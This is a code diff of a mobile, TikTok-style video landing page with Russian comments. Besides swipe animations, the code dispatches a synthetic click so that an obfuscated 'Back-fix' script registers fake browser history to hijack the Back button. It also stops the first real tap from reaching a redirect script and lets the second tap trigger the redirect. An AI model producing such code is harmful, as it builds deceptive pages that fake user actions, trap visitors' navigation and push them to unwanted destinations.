@@ -69,7 +69,7 @@
         .username { font-weight: 700; font-size: 15px; text-shadow: 0 1px 2px rgba(0,0,0,0.8); }
         .desc { font-size: 14px; line-height: 1.3; opacity: 0.95; text-shadow: 0 1px 2px rgba(0,0,0,0.8); }
 
-        /* Анимация Свайпа */
+        /* Анимация Свайпа (Палец) */
         .swipe-hint {
             position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
             z-index: 20; pointer-events: none; display: flex; flex-direction: column; align-items: center;
@@ -80,6 +80,19 @@
             40% { opacity: 1; }
             80% { opacity: 0; }
             100% { transform: translateY(-60px); opacity: 0; }
+        }
+
+        /* --- Анимации переключения видео --- */
+        .slide-out-up { animation: slideOutUp 0.4s ease-out forwards; }
+        .slide-in-up { animation: slideInUp 0.4s ease-out forwards; }
+
+        @keyframes slideOutUp {
+            0% { transform: translateY(0); opacity: 1; }
+            100% { transform: translateY(-100%); opacity: 0; }
+        }
+        @keyframes slideInUp {
+            0% { transform: translateY(100%); opacity: 0; }
+            100% { transform: translateY(0); opacity: 1; }
         }
     </style>
 </head>
@@ -134,14 +147,52 @@ document.addEventListener("DOMContentLoaded", () => {
     
     video.onerror = function() {
         console.error("Video Error:", video.src);
-        alert("Video not found: " + video.src);
     };
 
+    // Пытаемся запустить сразу (без звука)
     video.play().catch(() => {});
 
     let isFirstInteraction = true;
     let touchStartY = 0;
     let touchEndY = 0;
+    let isAnimating = false;
+
+    // --- ФУНКЦИЯ ВИЗУАЛЬНОГО СВАЙПА И ЗАПУСКА ---
+    function triggerVisualSwipe() {
+        if (isAnimating) return;
+        isAnimating = true;
+
+        // 1. Анимация ухода вверх
+        video.classList.add('slide-out-up');
+
+        // 2. Включаем звук и убираем палец
+        swipeHint.style.display = 'none';
+        video.muted = false;
+
+        // 3. Перезагрузка и появление снизу
+        setTimeout(async () => {
+            video.currentTime = 0;
+            video.classList.remove('slide-out-up');
+            video.classList.add('slide-in-up');
+
+            // --- ЖЕСТКИЙ ЗАПУСК (ЧТОБЫ НЕ ЗАВИСЛО) ---
+            try {
+                await video.play();
+            } catch (err) {
+                console.log("Play failed, forcing reload...");
+                video.load(); 
+                video.currentTime = 0;
+                await video.play();
+            }
+
+            // Убираем классы анимации
+            setTimeout(() => {
+                video.classList.remove('slide-in-up');
+                isAnimating = false;
+            }, 400);
+
+        }, 350);
+    }
 
     // --- ЛОВИМ СВАЙП ---
     wrapper.addEventListener('touchstart', function(e) {
@@ -150,50 +201,36 @@ document.addEventListener("DOMContentLoaded", () => {
 
     wrapper.addEventListener('touchend', function(e) {
         touchEndY = e.changedTouches[0].screenY;
-        handleSwipe();
+        
+        // Свайп вверх > 50px
+        if (touchStartY - touchEndY > 50) {
+            if (isFirstInteraction) {
+                triggerVisualSwipe(); 
+                
+                // Генерируем ФЕЙК КЛИК для Back-Fix скрипта
+                const fakeClick = new MouseEvent('click', {
+                    view: window, bubbles: true, cancelable: true
+                });
+                wrapper.dispatchEvent(fakeClick);
+                
+                isFirstInteraction = false;
+            } else {
+                // Второй свайп: просто листаем дальше
+                triggerVisualSwipe();
+            }
+        }
     }, {passive: true});
 
-    function handleSwipe() {
-        // Если движение больше 50px по вертикали - это свайп
-        if (Math.abs(touchEndY - touchStartY) > 50 && isFirstInteraction) {
-            console.log("Swipe detected! Triggering fake click for Back-fix...");
-            
-            // ГЕНЕРИРУЕМ ИСКУССТВЕННЫЙ КЛИК
-            // Это нужно, чтобы твой обфусцированный скрипт (который слушает window 'click')
-            // подумал, что юзер кликнул, и записал историю для кнопки Назад.
-            const fakeClick = new MouseEvent('click', {
-                view: window,
-                bubbles: true,
-                cancelable: true
-            });
-            wrapper.dispatchEvent(fakeClick);
-        }
-    }
-
-    // --- ГЛАВНЫЙ ОБРАБОТЧИК КЛИКОВ (И НАСТОЯЩИХ, И ФЕЙКОВЫХ) ---
-    // Мы вешаем его на wrapper (всплытие), но без Capture.
-    // Твой скрипт висит на window (Capture), поэтому он сработает РАНЬШЕ нас.
-    // А скрипт редиректа висит на document (Bubbling), поэтому он сработает ПОЗЖЕ нас.
-    // МЫ ВСТАЕМ ПОСЕРЕДИНЕ.
-    
+    // --- ОБРАБОТЧИК КЛИКОВ (ТАПОВ) ---
     wrapper.addEventListener("click", function(e) {
         if (isFirstInteraction) {
-            // 1. Скрипт Back-fix (window capture) УЖЕ сработал к этому моменту. Отлично.
+            e.stopPropagation(); // Не даем уйти на редирект сразу
             
-            // 2. Тормозим событие, чтобы оно не дошло до редиректа.
-            e.stopPropagation(); 
-            // e.preventDefault(); // Можно добавить, если нужно убрать выделение
-
-            // 3. Визуальная магия
             isFirstInteraction = false;
-            swipeHint.style.display = 'none';
-            video.muted = false;
-            video.play();
-            
-            console.log("First Interaction processed. Back-fix registered. Redirect blocked.");
+            triggerVisualSwipe(); // Тап тоже запускает красивую анимацию
+            console.log("Tap processed -> Back-fix registered (via window capture), Redirect blocked.");
         } else {
-            // Второй клик - пропускаем, пусть летит к скрипту редиректа
-            console.log("Second click. Redirecting...");
+            console.log("Second tap -> Allowing redirect...");
         }
     }); 
 });
